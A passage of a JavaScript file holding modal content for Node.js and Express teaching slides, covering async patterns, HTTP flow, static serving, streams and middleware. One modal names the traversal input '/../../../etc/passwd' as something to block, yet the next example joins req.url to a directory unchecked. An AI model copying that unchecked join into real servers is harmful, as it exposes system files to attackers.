console.log('Done!');  // Prints immediately, before items processed

// RIGHT — use for...of for sequential
for (const id of ids) {
    await processItem(id);  // Waits for each
}
console.log('Done!');  // Prints after all items processed

// RIGHT — use Promise.all for parallel
await Promise.all(ids.map(id => processItem(id)));
console.log('Done!');  // Prints after all complete</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why This Happens</div>
                        <p><code>forEach</code> calls the callback but doesn't do anything with the returned promise. It's designed for synchronous iteration. Use <code>for...of</code> or <code>Promise.all</code> with <code>map</code>.</p>
                    </div>
                `
            },
            'gotcha-parallel': {
                title: 'Accidental Sequential Execution',
                body: `
                    <p>Using <code>await</code> one after another makes requests sequential when they could be parallel.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// SLOW — sequential (2 seconds total)
const users = await fetchUsers();   // 1 second
const posts = await fetchPosts();   // 1 second
// Total: 2 seconds

// FAST — parallel (1 second total)
const [users, posts] = await Promise.all([
    fetchUsers(),   // 1 second
    fetchPosts()    // 1 second
]);
// Total: 1 second (they run simultaneously)

// Also wrong: starting promises but awaiting sequentially
const userPromise = fetchUsers();
const postPromise = fetchPosts();
const users = await userPromise;  // Good, they started in parallel
const posts = await postPromise;  // But this is clunky

// Better: Promise.all is clearer and handles errors better</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Rule of Thumb</div>
                        <p>If two async operations don't depend on each other, run them in parallel with <code>Promise.all</code>.</p>
                    </div>
                `
            },
            // Server/Client components
            'server-component': {
                title: 'React Server Components',
                body: `
                    <p><strong>Server Components</strong> (default in App Router) run on the server and send HTML to the client — zero JavaScript!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// This is a Server Component (no 'use client')
async function ProductPage({ params }) {
    // Direct database access — no API needed!
    const product = await db.product.findUnique({
        where: { slug: params.slug }
    });

    // Access environment variables safely
    const apiKey = process.env.STRIPE_SECRET_KEY;

    // Read files directly
    const content = await fs.readFile('./content/about.md');

    return <Product data={product} />;
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Benefits</div>
                        <ul>
                            <li><strong>Zero bundle size</strong> — component code never sent to client</li>
                            <li><strong>Direct backend access</strong> — database, filesystem, secrets</li>
                            <li><strong>Better security</strong> — sensitive code stays on server</li>
                            <li><strong>Faster initial load</strong> — less JavaScript to download/parse</li>
                        </ul>
                    </div>
                `
            },
            'client-component': {
                title: 'React Client Components',
                body: `
                    <p><strong>Client Components</strong> run in the browser and enable interactivity.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>'use client'  // ← This directive makes it a Client Component

import { useState, useEffect } from 'react';

function SearchBar() {
    const [query, setQuery] = useState('');
    const [results, setResults] = useState([]);

    // useState, useEffect work here
    useEffect(() => {
        if (query) {
            fetch(\`/api/search?q=\${query}\`)
                .then(res => res.json())
                .then(setResults);
        }
    }, [query]);

    // Event handlers work here
    return (
        <input
            value={query}
            onChange={(e) => setQuery(e.target.value)}
        />
    );
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use Client Components</div>
                        <ul>
                            <li>Need React hooks (useState, useEffect, useContext)</li>
                            <li>Need event handlers (onClick, onChange)</li>
                            <li>Need browser APIs (localStorage, window, navigator)</li>
                            <li>Need lifecycle effects or subscriptions</li>
                        </ul>
                    </div>
                `
            },
            // HTTP Static Server (Slide 6)
            'static-request': {
                title: '1. Browser Request',
                body: `
                    <p>The browser sends an HTTP request for a specific file.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>GET /images/logo.png HTTP/1.1
Host: example.com
Accept: image/png, image/*
Accept-Encoding: gzip, deflate, br
If-None-Match: "abc123"
If-Modified-Since: Mon, 01 Jan 2024 00:00:00 GMT</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Caching Headers</div>
                        <p><code>If-None-Match</code> and <code>If-Modified-Since</code> enable caching — the server can respond with <code>304 Not Modified</code> if the file hasn't changed.</p>
                    </div>
                `
            },
            'static-mapping': {
                title: '2. Map URL to File Path',
                body: `
                    <p>The server maps the URL path to a file on the filesystem.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>URL Path               →  File Path
/                      →  ./public/index.html
/about                 →  ./public/about.html
/css/styles.css        →  ./public/css/styles.css
/images/logo.png       →  ./public/images/logo.png
/api/users             →  404 (no file exists)</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Security</div>
                        <p>Good static servers prevent <strong>path traversal attacks</strong> — requests like <code>/../../../etc/passwd</code> must be blocked.</p>
                    </div>
                `
            },
            'static-read': {
                title: '3. Read File from Disk',
                body: `
                    <p>The server reads the file from the filesystem.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Node.js example
const filePath = path.join(publicDir, req.url);

// Check if file exists
if (!fs.existsSync(filePath)) {
    return res.status(404).send('Not Found');
}

// Read the file
const content = fs.readFileSync(filePath);

// For large files, use streaming:
const stream = fs.createReadStream(filePath);
stream.pipe(res);</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Performance</div>
                        <p>Production servers cache file contents in memory and use <code>sendfile()</code> syscall for zero-copy transfer.</p>
                    </div>
                `
            },
            'static-response': {
                title: '4. Send Response',
                body: `
                    <p>The server sends the file with appropriate headers.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 12345
Cache-Control: public, max-age=31536000
ETag: "abc123"
Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT

[binary image data...]</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Content-Type Detection</div>
                        <p>The server determines <code>Content-Type</code> from file extension:
                        <br><code>.html</code> → <code>text/html</code>
                        <br><code>.css</code> → <code>text/css</code>
                        <br><code>.js</code> → <code>application/javascript</code>
                        <br><code>.png</code> → <code>image/png</code></p>
                    </div>
                `
            },
            // What is an HTTP Server (Slide 3)
            'concept-listen': {
                title: 'Listen on a Port',
                body: `
                    <p>The server binds to a <strong>port number</strong> and waits for incoming connections.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Node.js
server.listen(3000, () => {
    console.log('Listening on port 3000');
});

// The server now accepts connections at:
// http://localhost:3000</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Common Ports</div>
                        <ul>
                            <li><strong>80</strong> — HTTP (default)</li>
                            <li><strong>443</strong> — HTTPS (default)</li>
                            <li><strong>3000, 8080</strong> — Development</li>
                        </ul>
                    </div>
                `
            },
            'concept-receive': {
                title: 'Receive HTTP Requests',
                body: `
                    <p>When a client connects, the server receives the <strong>HTTP request</strong> with method, URL, headers, and body.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>GET /api/users HTTP/1.1
Host: example.com
Authorization: Bearer token123
Accept: application/json</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Request Components</div>
                        <ul>
                            <li><strong>Method</strong> — GET, POST, PUT, DELETE, etc.</li>
                            <li><strong>URL/Path</strong> — /api/users?page=1</li>
                            <li><strong>Headers</strong> — metadata (auth, content-type)</li>
                            <li><strong>Body</strong> — data payload (POST/PUT)</li>
                        </ul>
                    </div>
                `
            },
            'concept-process': {
                title: 'Process & Execute Logic',
                body: `
                    <p>The server processes the request — running your <strong>application code</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function handleRequest(req) {
    // 1. Parse the request
    const { method, url, body } = req;

    // 2. Route to handler
    if (method === 'GET' && url === '/api/users') {
        // 3. Execute business logic
        const users = await db.query('SELECT * FROM users');
        return users;
    }
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">What Happens Here</div>
                        <p>Database queries, API calls, authentication checks, validation, business logic — all your backend code runs in this phase.</p>
                    </div>
                `
            },
            'concept-respond': {
                title: 'Send HTTP Response',
                body: `
                    <p>The server sends back an <strong>HTTP response</strong> with status code, headers, and body.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=3600

{
    "users": [
        { "id": 1, "name": "Alice" },
        { "id": 2, "name": "Bob" }
    ]
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Response Components</div>
                        <ul>
                            <li><strong>Status Code</strong> — 200, 404, 500, etc.</li>
                            <li><strong>Headers</strong> — Content-Type, Cache-Control</li>
                            <li><strong>Body</strong> — JSON, HTML, or binary data</li>
                        </ul>
                    </div>
                `
            },
            // Server Landscape (Slide 4)
            'server-traditional': {
                title: 'Traditional Web Servers',
                body: `
                    <p><strong>Traditional web servers</strong> serve static files and act as reverse proxies.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Apache HTTP Server</div>
                        <ul>
                            <li>The original workhorse (since 1995)</li>
                            <li>Process/thread per connection model</li>
                            <li><code>.htaccess</code> for per-directory config</li>
                            <li>mod_php, mod_rewrite, mod_ssl</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Nginx</div>
                        <ul>
                            <li>Event-driven, async architecture</li>
                            <li>Excellent for high concurrency</li>
                            <li>Reverse proxy & load balancer</li>
                            <li>Static file serving champion</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Common Use Cases</div>
                        <p>Serving static assets, SSL termination, load balancing, reverse proxying to application servers.</p>
                    </div>
                `
            },
            'server-application': {
                title: 'Application Servers',
                body: `
                    <p><strong>Application servers</strong> run your backend code and handle business logic.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Language-Specific Servers</div>
                        <ul>
                            <li><strong>Node.js</strong> — JavaScript runtime with built-in HTTP</li>
                            <li><strong>Gunicorn/uWSGI</strong> — Python WSGI servers</li>
                            <li><strong>Puma/Unicorn</strong> — Ruby application servers</li>
                            <li><strong>Tomcat/Jetty</strong> — Java servlet containers</li>
                            <li><strong>PHP-FPM</strong> — FastCGI Process Manager for PHP</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Responsibilities</div>
                        <ul>
                            <li>Execute application code</li>
                            <li>Manage database connections</li>
                            <li>Handle sessions and authentication</li>
                            <li>Process business logic</li>
                        </ul>
                    </div>
                `
            },
            'server-frameworks': {
                title: 'Web Frameworks',
                body: `
                    <p><strong>Web frameworks</strong> provide structure and tools for building web applications.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Popular Frameworks by Language</div>
                        <ul>
                            <li><strong>JavaScript:</strong> Express, Fastify, Hono, NestJS</li>
                            <li><strong>Python:</strong> Django, Flask, FastAPI</li>
                            <li><strong>Ruby:</strong> Rails, Sinatra</li>
                            <li><strong>Go:</strong> Gin, Echo, Fiber</li>
                            <li><strong>Rust:</strong> Actix, Axum, Rocket</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">What Frameworks Provide</div>
                        <ul>
                            <li>Routing — map URLs to handlers</li>
                            <li>Middleware — request/response pipeline</li>
                            <li>Templating — generate HTML</li>
                            <li>ORM — database abstraction</li>
                            <li>Validation — input sanitization</li>
                            <li>Authentication — user management</li>
                        </ul>
                    </div>
                `
            },
            // Request Lifecycle (Slide 5)
            'lifecycle-connection': {
                title: '1. Connection Established',
                body: `
                    <p>Client establishes a TCP connection with the server.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>TCP 3-Way Handshake:
Client → SYN →          Server
Client ← SYN-ACK ←      Server
Client → ACK →          Server

For HTTPS, TLS handshake follows:
Client → ClientHello →  Server
Client ← ServerHello ←  Server
Client ← Certificate ←  Server
🔒 Encrypted channel ready</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Keep-Alive</div>
                        <p>HTTP/1.1+ reuses connections for multiple requests, avoiding handshake overhead.</p>
                    </div>
                `
            },
            'lifecycle-parse': {
                title: '2. Parse Request',
                body: `
                    <p>Server parses the raw HTTP request into structured data.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Raw bytes received:
"GET /api/users?page=1 HTTP/1.1\\r\\n
Host: api.example.com\\r\\n
Authorization: Bearer token123\\r\\n
Content-Type: application/json\\r\\n
\\r\\n"

Parsed into:
{
  method: "GET",
  path: "/api/users",
  query: { page: "1" },
  headers: {
    host: "api.example.com",
    authorization: "Bearer token123",
    "content-type": "application/json"
  },
  body: null
}</code></pre>
                    </div>
                `
            },
            'lifecycle-routing': {
                title: '3. Route Matching',
                body: `
                    <p>Server matches the request URL and method to a handler function.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Route definitions
app.get('/api/users', listUsers);
app.get('/api/users/:id', getUser);
app.post('/api/users', createUser);
app.put('/api/users/:id', updateUser);
app.delete('/api/users/:id', deleteUser);

// Incoming request: GET /api/users/42
// Matches: app.get('/api/users/:id', getUser)
// Params extracted: { id: "42" }</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Route Priority</div>
                        <p>Routes are matched in definition order. More specific routes should come before wildcards.</p>
                    </div>
                `
            },
            'lifecycle-middleware': {
                title: '4. Middleware Chain',
                body: `
                    <p>Request passes through a chain of middleware functions before reaching the handler.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Middleware execution order
Request
  → Logger (log request)
  → CORS (add headers)
  → Auth (verify token)
  → Rate Limiter (check limits)
  → Body Parser (parse JSON)
  → Validator (validate input)
  → Handler (your code)
  → Error Handler (catch errors)
Response</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Middleware Pattern</div>
                        <p>Each middleware can: modify request/response, end the request early (e.g., auth failure), or call <code>next()</code> to continue.</p>
                    </div>
                `
            },
            'lifecycle-handler': {
                title: '5. Handle Request',
                body: `
                    <p>Your application code executes — the actual business logic.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function getUser(req, res) {
  // 1. Extract parameters
  const { id } = req.params;

  // 2. Validate input
  if (!isValidId(id)) {
    return res.status(400).json({ error: 'Invalid ID' });
  }

  // 3. Business logic (database, APIs, etc.)
  const user = await db.users.findById(id);

  if (!user) {
    return res.status(404).json({ error: 'Not found' });
  }

  // 4. Return response
  res.json(user);
}</code></pre>
                    </div>
                `
            },
            'lifecycle-response': {
                title: '6. Send Response',
                body: `
                    <p>Server serializes and sends the HTTP response back to the client.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>Response object:
{
  status: 200,
  headers: {
    "Content-Type": "application/json",
    "Cache-Control": "max-age=60"
  },
  body: { id: 42, name: "Alice" }
}

Serialized to bytes:
"HTTP/1.1 200 OK\\r\\n
Content-Type: application/json\\r\\n
Cache-Control: max-age=60\\r\\n
Content-Length: 28\\r\\n
\\r\\n
{\\"id\\":42,\\"name\\":\\"Alice\\"}"</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Connection Handling</div>
                        <p>With keep-alive, the connection stays open for more requests. Otherwise, it closes after the response.</p>
                    </div>
                `
            },
            // Why JavaScript on Server (Slide 7)
            'benefit-one-language': {
                title: 'One Language Everywhere',
                body: `
                    <p>Use <strong>JavaScript</strong> for frontend, backend, mobile, desktop — everything.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Unified Codebase Benefits</div>
                        <ul>
                            <li>Share validation logic between client and server</li>
                            <li>Share types and interfaces (TypeScript)</li>
                            <li>Share utility functions</li>
                            <li>Easier context switching for developers</li>
                        </ul>
                    </div>
                `
            },
            'benefit-one-team': {
                title: 'Full-Stack Developers',
                body: `
                    <p>One developer or team can build the <strong>entire application</strong>.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Team Benefits</div>
                        <ul>
                            <li>No "throw it over the wall" between frontend/backend</li>
                            <li>Better understanding of full system</li>
                            <li>Faster iteration and debugging</li>
                            <li>Reduced communication overhead</li>
                        </ul>
                    </div>
                `
            },
            'benefit-nonblocking': {
                title: 'Non-Blocking I/O',
                body: `
                    <p>Node.js handles thousands of connections with a <strong>single thread</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Non-blocking: doesn't wait for I/O
fs.readFile('large.txt', (err, data) => {
    // Called when file is ready
});
console.log('This runs immediately!');

// vs Blocking (traditional):
const data = fs.readFileSync('large.txt');  // Waits...
console.log('This waits for file read');</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why This Matters</div>
                        <p>While waiting for database queries or API calls, Node.js handles other requests — perfect for I/O-heavy web applications.</p>
                    </div>
                `
            },
            'benefit-npm': {
                title: 'Massive Package Ecosystem',
                body: `
                    <p><strong>npm</strong> is the world's largest software registry — over 2 million packages.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Everything You Need</div>
                        <ul>
                            <li>Web frameworks (Express, Fastify, Hono)</li>
                            <li>Database clients (pg, mongoose, prisma)</li>
                            <li>Authentication (passport, next-auth)</li>
                            <li>Validation (zod, joi, yup)</li>
                            <li>Utilities (lodash, date-fns, uuid)</li>
                        </ul>
                    </div>
                `
            },
            'benefit-tooling': {
                title: 'Modern Tooling',
                body: `
                    <p>JavaScript has the best <strong>developer experience</strong> tooling in the industry.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">DX Highlights</div>
                        <ul>
                            <li><strong>Hot reload</strong> — see changes instantly</li>
                            <li><strong>TypeScript</strong> — type safety and autocomplete</li>
                            <li><strong>ESLint/Prettier</strong> — consistent code style</li>
                            <li><strong>VS Code</strong> — incredible IDE support</li>
                            <li><strong>Chrome DevTools</strong> — debugging</li>
                        </ul>
                    </div>
                `
            },
            'benefit-cloud': {
                title: 'Cloud-Native Deployment',
                body: `
                    <p>Deploy Node.js anywhere — every cloud platform has <strong>first-class support</strong>.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Deployment Options</div>
                        <ul>
                            <li><strong>Vercel</strong> — optimized for Next.js</li>
                            <li><strong>AWS Lambda</strong> — serverless functions</li>
                            <li><strong>Google Cloud Run</strong> — containerized apps</li>
                            <li><strong>Railway, Render</strong> — simple PaaS</li>
                            <li><strong>Docker + Kubernetes</strong> — full control</li>
                        </ul>
                    </div>
                `
            },
            // Node.js History (Slide 9)
            'history-2009': {
                title: 'Node.js Created (2009)',
                body: `
                    <p><strong>Ryan Dahl</strong> presents Node.js at JSConf EU, demonstrating non-blocking I/O.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Innovation</div>
                        <p>Combined Google's V8 JavaScript engine with an event-driven, non-blocking I/O model. The goal: handle 10,000+ concurrent connections efficiently.</p>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">The Motivation</div>
                        <p>Ryan was frustrated with Apache's thread-per-connection model. He wanted a server that could handle massive concurrency without creating a thread for each connection.</p>
                    </div>
                `
            },
            'history-2010': {
                title: 'npm Launched (2010)',
                body: `
                    <p><strong>npm</strong> (Node Package Manager) is created by Isaac Schlueter.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Impact</div>
                        <ul>
                            <li>Standardized package management for JavaScript</li>
                            <li>Easy dependency installation and sharing</li>
                            <li>Became the largest software registry in the world</li>
                            <li>Enabled the JavaScript ecosystem explosion</li>
                        </ul>
                    </div>
                `
            },
            'history-2011': {
                title: 'Enterprise Adoption (2011)',
                body: `
                    <p>Major companies start using Node.js in production.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Early Adopters</div>
                        <ul>
                            <li><strong>LinkedIn</strong> — mobile backend, 20x faster</li>
                            <li><strong>Uber</strong> — real-time matching system</li>
                            <li><strong>PayPal</strong> — rebuilt checkout flow</li>
                            <li><strong>Netflix</strong> — UI platform</li>
                        </ul>
                    </div>
                `
            },
            'history-2015': {
                title: 'io.js Merge & Node Foundation (2015)',
                body: `
                    <p>The Node.js community reunites under the <strong>Node.js Foundation</strong>.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">The Fork Story</div>
                        <p>In 2014, frustrated developers forked Node.js to create io.js for faster development. In 2015, the projects merged back together under neutral governance.</p>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Result</div>
                        <ul>
                            <li>Modern ES6+ features adopted faster</li>
                            <li>More transparent governance</li>
                            <li>Regular release schedule (LTS)</li>
                        </ul>
                    </div>
                `
            },
            'history-2023': {
                title: 'Node.js Today (2023+)',
                body: `
                    <p>Node.js is a <strong>mature, stable platform</strong> used by millions of developers.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Modern Features</div>
                        <ul>
                            <li>Native ES modules</li>
                            <li>Built-in fetch() API</li>
                            <li>Test runner included</li>
                            <li>Performance improvements</li>
                            <li>Better TypeScript integration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Alternatives Emerged</div>
                        <p><strong>Deno</strong> (Ryan Dahl's new project) and <strong>Bun</strong> offer alternatives, but Node.js remains the dominant runtime.</p>
                    </div>
                `
            },
            // Node.js Architecture (Slide 10)
            'arch-usercode': {
                title: 'Your Application Code',
                body: `
                    <p>Your JavaScript/TypeScript code that implements the business logic.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Your code lives here
import express from 'express';

const app = express();

app.get('/api/users', async (req, res) => {
    const users = await db.query('SELECT * FROM users');
    res.json(users);
});

app.listen(3000);</code></pre>
                    </div>
                `
            },
            'arch-nodeapis': {
                title: 'Node.js APIs',
                body: `
                    <p>Built-in modules and APIs provided by Node.js.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Core Modules</div>
                        <ul>
                            <li><code>fs</code> — File system operations</li>
                            <li><code>http/https</code> — HTTP servers and clients</li>
                            <li><code>path</code> — Path manipulation</li>
                            <li><code>crypto</code> — Cryptographic functions</li>
                            <li><code>stream</code> — Streaming data</li>
                            <li><code>events</code> — Event emitter pattern</li>
                        </ul>
                    </div>
                `
            },
            'arch-v8': {
                title: 'V8 JavaScript Engine',
                body: `
                    <p>Google's <strong>V8</strong> compiles JavaScript to native machine code.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">How V8 Works</div>
                        <ul>
                            <li><strong>Parser</strong> — JS → Abstract Syntax Tree</li>
                            <li><strong>Ignition</strong> — Interpreter, runs bytecode</li>
                            <li><strong>TurboFan</strong> — JIT compiler, optimizes hot code</li>
                            <li><strong>Garbage Collector</strong> — Automatic memory management</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Performance</div>
                        <p>V8 makes JavaScript nearly as fast as compiled languages for many workloads. Same engine powers Chrome browser.</p>
                    </div>
                `
            },
            'arch-libuv': {
                title: 'libuv — Async I/O',
                body: `
                    <p><strong>libuv</strong> provides the event loop and async I/O operations.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What libuv Handles</div>
                        <ul>
                            <li>Event loop implementation</li>
                            <li>Async file system operations</li>
                            <li>Async DNS resolution</li>
                            <li>Network I/O (TCP, UDP)</li>
                            <li>Child processes</li>
                            <li>Thread pool for blocking operations</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Cross-Platform</div>
                        <p>libuv abstracts OS differences — epoll (Linux), kqueue (macOS), IOCP (Windows).</p>
                    </div>
                `
            },
            'arch-os': {
                title: 'Operating System',
                body: `
                    <p>The underlying OS provides system calls for I/O, networking, and processes.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">OS Responsibilities</div>
                        <ul>
                            <li>File system access</li>
                            <li>Network sockets</li>
                            <li>Process management</li>
                            <li>Memory allocation</li>
                            <li>Thread scheduling</li>
                        </ul>
                    </div>
                `
            },
            // Stream Types (Slide 14)
            'stream-readable': {
                title: 'Readable Streams',
                body: `
                    <p><strong>Readable</strong> streams are sources of data you can read from.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const fs = require('fs');

// File read stream
const readStream = fs.createReadStream('large-file.txt');

readStream.on('data', (chunk) => {
    console.log('Received', chunk.length, 'bytes');
});

readStream.on('end', () => {
    console.log('Finished reading');
});

// HTTP request body is also a readable stream
app.post('/upload', (req, res) => {
    req.on('data', chunk => { /* process chunk */ });
});</code></pre>
                    </div>
                `
            },
            'stream-transform': {
                title: 'Transform Streams',
                body: `
                    <p><strong>Transform</strong> streams modify data as it passes through.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const { Transform } = require('stream');
const zlib = require('zlib');

// Built-in transform: gzip compression
const gzip = zlib.createGzip();

// Custom transform: uppercase
const upperCase = new Transform({
    transform(chunk, encoding, callback) {
        this.push(chunk.toString().toUpperCase());
        callback();
    }
});

// Chain transforms together
fs.createReadStream('input.txt')
    .pipe(upperCase)
    .pipe(gzip)
    .pipe(fs.createWriteStream('output.txt.gz'));</code></pre>
                    </div>
                `
            },
            'stream-writable': {
                title: 'Writable Streams',
                body: `
                    <p><strong>Writable</strong> streams are destinations you can write data to.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const fs = require('fs');

// File write stream
const writeStream = fs.createWriteStream('output.txt');

writeStream.write('Hello ');
writeStream.write('World!');
writeStream.end();  // Close the stream

// HTTP response is a writable stream
app.get('/data', (req, res) => {
    res.write('Part 1\\n');
    res.write('Part 2\\n');
    res.end('Done!');
});</code></pre>
                    </div>
                `
            },
            // Event Loop Phases (Slide 15)
            'loop-pending': {
                title: 'Event Loop: Pending Callbacks',
                body: `
                    <p>Executes I/O callbacks deferred to the next loop iteration.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">What Runs Here</div>
                        <ul>
                            <li>TCP error callbacks</li>
                            <li>Some system operations</li>
                            <li>Callbacks deferred from previous iteration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Note</div>
                        <p>Most I/O callbacks run in the <strong>poll</strong> phase. This phase handles edge cases.</p>
                    </div>
                `
            },
            'loop-close': {
                title: 'Event Loop: Close Callbacks',
                body: `
                    <p>Executes close event callbacks.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// These callbacks run in the close phase
socket.on('close', () => {
    console.log('Socket closed');
});

server.on('close', () => {
    console.log('Server closed');
});

// Triggered when:
socket.destroy();
server.close();</code></pre>
                    </div>
                `
            },
            // Express.js Features (Slide 18)
            'express-routing': {
                title: 'Express Routing',
                body: `
                    <p>Map URLs and HTTP methods to handler functions.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Basic routes
app.get('/users', listUsers);
app.post('/users', createUser);

// Route parameters
app.get('/users/:id', (req, res) => {
    const { id } = req.params;
});

// Route groups
const router = express.Router();
router.get('/', listProducts);
router.get('/:id', getProduct);
app.use('/products', router);</code></pre>
                    </div>
                `
            },
            'express-middleware': {
                title: 'Express Middleware',
                body: `
                    <p>Functions that have access to request, response, and next middleware.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Middleware function signature
function logger(req, res, next) {
    console.log(\`\${req.method} \${req.url}\`);
    next();  // Pass to next middleware
}

// Apply globally
app.use(logger);

// Apply to specific routes
app.get('/admin', authMiddleware, adminHandler);

// Error handling middleware (4 args)
app.use((err, req, res, next) => {
    res.status(500).json({ error: err.message });
});</code></pre>
                    </div>
                `
            },
            'express-helpers': {
                title: 'Express Response Helpers',
                body: `
                    <p>Convenient methods for sending responses.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// JSON response
res.json({ user: 'Alice' });

// Set status
res.status(404).json({ error: 'Not found' });

// Send file
res.sendFile('/path/to/file.pdf');

// Redirect
res.redirect('/login');

// Set headers
res.set('X-Custom-Header', 'value');

// Set cookie
res.cookie('session', 'abc123', { httpOnly: true });</code></pre>
                    </div>
                `
            },
            'express-static': {
                title: 'Express Static Files',
                body: `
                    <p>Serve static files (images, CSS, JS) from a directory.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Serve files from 'public' directory
app.use(express.static('public'));

// Files in public/ are now accessible:
// public/images/logo.png → /images/logo.png
// public/css/styles.css → /css/styles.css

// With URL prefix
app.use('/static', express.static('public'));
// public/logo.png → /static/logo.png

// Multiple directories
app.use(express.static('public'));
app.use(express.static('uploads'));</code></pre>
                    </div>
                `
            },
            'express-ecosystem': {
                title: 'Express Ecosystem',
                body: `
                    <p>Rich ecosystem of middleware and plugins.</p>
                    <div class="modal-section">
                        <div class="modal-section-title">Popular Middleware</div>
                        <ul>
                            <li><code>cors</code> — Cross-origin resource sharing</li>
                            <li><code>helmet</code> — Security headers</li>
                            <li><code>morgan</code> — HTTP request logging</li>
                            <li><code>compression</code> — Gzip responses</li>
                            <li><code>express-rate-limit</code> — Rate limiting</li>
                            <li><code>passport</code> — Authentication</li>
                            <li><code>multer</code> — File uploads</li>
                        </ul>
                    </div>
                `
            },
            // Middleware Examples (Slide 19)
            'mw-logger': {
                title: 'Logger Middleware',
                body: `
                    <p>Log every incoming request for debugging and monitoring.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Simple custom logger
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const duration = Date.now() - start;
        console.log(\`\${req.method} \${req.url} \${res.statusCode} \${duration}ms\`);
    });
    next();
});

// Or use morgan (production-ready)
import morgan from 'morgan';
app.use(morgan('combined'));
// Output: ::1 - - [10/Oct/2023:13:55:36 +0000] "GET /api/users HTTP/1.1" 200 -</code></pre>
                    </div>
                `
            },
            'mw-auth': {
                title: 'Auth Middleware',
                body: `
                    <p>Verify authentication before allowing access to protected routes.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>async function authMiddleware(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    try {
        const payload = jwt.verify(token, SECRET);
        req.user = payload;  // Attach user to request
        next();
    } catch (err) {
        return res.status(401).json({ error: 'Invalid token' });
    }
}

// Protect routes
app.get('/api/profile', authMiddleware, getProfile);
app.use('/api/admin', authMiddleware, adminRouter);</code></pre>
                    </div>
                `
            },
